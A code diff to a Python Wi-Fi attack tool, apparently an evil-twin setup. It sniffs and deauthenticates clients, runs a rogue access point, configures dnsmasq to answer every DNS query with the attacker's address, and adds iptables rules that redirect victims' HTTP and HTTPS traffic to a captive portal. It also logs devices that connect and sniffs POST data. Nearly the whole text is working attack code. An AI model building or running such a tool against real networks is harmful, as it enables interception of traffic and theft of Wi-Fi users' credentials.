@@ -1,6 +1,9 @@
 import argparse
 import fcntl
 import os
+import signal
+import sys
+
 import getmac
 from getmac import get_mac_address
 from progress.bar import IncrementalBar, ShadyBar, PixelBar, Bar, FillingSquaresBar, ChargingBar, FillingCirclesBar
@@ -9,15 +12,19 @@ from scapy.all import *
 import time
 import netifaces
 import http.server
+from scapy.layers.dhcp import DHCP
 from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth, Dot11Beacon, Dot11ProbeResp, Dot11ProbeReq
 from scapy.layers.http import HTTPRequest
 from scapy.layers.l2 import Ether
-interface=''
+
+interface = ''
 mac = ''
 victim = ''
 client_AP = dict()
 AP = {}
 php_version = 7.4
+from_ch = ''
+connected_stations = dict()
 presentation = '''
 
   ______           _   _     _______              _         
@@ -74,12 +81,13 @@ def monitor_mode(iface):
 
 
 def add_ap(pkt):
+    global from_ch
     global AP
     if pkt.haslayer(Dot11Beacon):
         ssid = pkt[Dot11Beacon].network_stats()['ssid']
 
     bssid = pkt[Dot11].addr3.lower()  # ap mac address
-    ap_channel = str(ord(pkt[Dot11Elt:3].info))
+    ap_channel = str(from_ch)
     if bssid in AP:
         return
     else:
@@ -161,6 +169,7 @@ def mon_mac(mon_iface):
 
 
 def sniffer(iface, ch):
+    global from_ch
     if ch:
         if int(ch[0]) not in range(1, 14) and int(ch[1]) not in range(1, 14):
             print("Invalid channels. Channels should be between 1 and 14")
@@ -184,14 +193,14 @@ def sniffer(iface, ch):
 
 
 def output():
-    dash = '-' * 60
+    dash = '-' * 120
     global AP
     print(dash)
-    print('{:<20s}{:>10s}{:>25s}'.format('ESSID', 'CH', 'Access Points'))
+    print('{:<40s}{:>40s}{:>30s}'.format('ESSID', 'CH', 'Access Points'))
     print(dash)
     for i in AP:
         ssid = AP[i]['ESSID']
-        print('{:<20s}{:>10s}{:^40s}'.format(ssid, AP[i]['channel'], i))
+        print('{:<40s}{:>40s}{:^50s}'.format(ssid, AP[i]['channel'], i))
     print('\n')
 
 
@@ -265,23 +274,23 @@ def configDnsmasq(iface):
     dnsmasqConfig = ''
     print('[+] Configuring dnsmasq...')
     dnsmasqConfig += 'interface=' + iface + '\n'  # Interface in which dnsmasq listen
-    dnsmasqConfig += 'dhcp-range=192.168.1.2,192.168.1.250,255.255.255.0,12h\n'  # Range of IPs to set to clients for the DHCP server
-    dnsmasqConfig += 'dhcp-option=3,192.168.1.1\n'  # Set router to 192.168.1.1
-    dnsmasqConfig += 'dhcp-option=6,192.168.1.1\n'  # Set dns server to 192.168.1.1
-    dnsmasqConfig += 'address=/#/192.168.1.1\n'  # Response to every DNS query with 192.168.1.1 (where our captive portal is)
+    dnsmasqConfig += 'dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h\n'  # Range of IPs to set to clients for the DHCP server
+    dnsmasqConfig += 'dhcp-option=3,10.0.0.1\n'  # Set router to 10.0.0.1
+    dnsmasqConfig += 'dhcp-option=6,10.0.0.1\n'  # Set dns server to 10.0.0.1
+    dnsmasqConfig += 'address=/#/10.0.0.1\n'  # Response to every DNS query with 10.0.0.1 (where our captive portal is)
     dnsmasqConfig += 'address=/www.google.com/216.58.209.2\n'
     f = open(dnsmasqConfigFile, 'w')
     f.write(dnsmasqConfig)
     f.close()
 
     # Set inet address of interface to 10.0.0.1
-    os.system('ifconfig ' + iface + ' 192.168.1.1 netmask 255.255.255.0')
+    os.system('ifconfig ' + iface + ' 10.0.0.1 netmask 255.255.255.0')
     # route http traffic to captive portal page
     os.system(
         'sudo iptables -t nat -A PREROUTING -p tcp -m tcp -s 10.0.0.0/24 --dport 80 -j DNAT --to-destination 10.0.0.1')
     # route https traffic to captive portal page
     os.system(
-        'sudo iptables -t nat -A PREROUTING -p tcp -m tcp -s 10.0.0.0/24 --dport 80 -j DNAT --to-destination 10.0.0.1')
+        'sudo iptables -t nat -A PREROUTING -p tcp -m tcp -s 10.0.0.0/24 --dport 443 -j DNAT --to-destination 10.0.0.1')
     # Initialize dnsmasq
     os.system('dnsmasq -C ' + dnsmasqConfigFile)
     print('[+] dnsmasq successfully configured')
@@ -307,11 +316,11 @@ def config_portal():
 
 
 def dhcp_handler(pkt):
-    global client_AP
-
-    if pkt.haslayer(Ether):
-        if str(pkt.getlayer(Ether).dst).lower() in client_AP:
-            print("[+]", pkt.getlayer(Ether).dst, " has connected to our access point")
+    global connected_stations
+    # dhcp offer:
+    if DHCP in pkt and pkt[DHCP].options[0][1] == 2 and pkt.getlayer(Ether).dst not in connected_stations:
+        connected_stations[pkt.getlayer(Ether).dst] = '1'
+        print("[+]", pkt.getlayer(Ether).dst, " has connected to our access point")
 
 
 def post_handler(pkt):
@@ -327,7 +336,26 @@ def post_handler(pkt):
 
 
 def sniff_dhcp(iface):
-    sniff(iface=iface, filter='udp and (src port 67 and dst port 68)', stop_filter=dhcp_handler)
+    sniff(iface=iface, filter='udp and (port 67 or port 68)', prn=dhcp_handler)
+
+
+def sig_handler(signum, frame):
+    global interface
+    msg = input("Ctrl-c was pressed. Do you really want to exit? y/n ")
+    if msg == 'y':
+        os.system("killall dnsmasq")
+        os.system("killall hostapd")
+        os.system('iptables -F')
+        os.system('iptables -t nat -F')
+        os.system("ifconfig " + str(interface) + " down")
+        os.system("ifconfig " + str(interface) + " up")
+        os.system("rm dnsmasq.conf")
+        os.system("rm hostapd.conf")
+        sys.exit()
+    else:
+        print("", end="\r", flush=True)
+        print(" " * len(msg), end="", flush=True)  # clear the printed line
+        print("    ", end="\r", flush=True)
 
 
 if __name__ == "__main__":
@@ -359,17 +387,8 @@ if __name__ == "__main__":
     time.sleep(1)
     configDnsmasq(interface)
     time.sleep(1)
-    Thread(target=sniff_dhcp, args=(interface,)).start()
+    signal.signal(signal.SIGINT, sig_handler)
+    sniff_dhcp(interface)
 
-    '''print('[+] Flushing iptables...')
-    os.system('iptables -F')
-    os.system('iptables -t nat -F')
-    print('[+] Iptables flushed')
-    os.system("killall dnsmasq")
-    os.system("killall hostapd")
-    os.system("killall hostapd")
-    os.system("ifconfig interface down")
-    os.system("ifconfig interface up")
-    
-    os.system("rm hostapd.conf")
-    os.system("rm dnsmasq.conf")'''
+
+
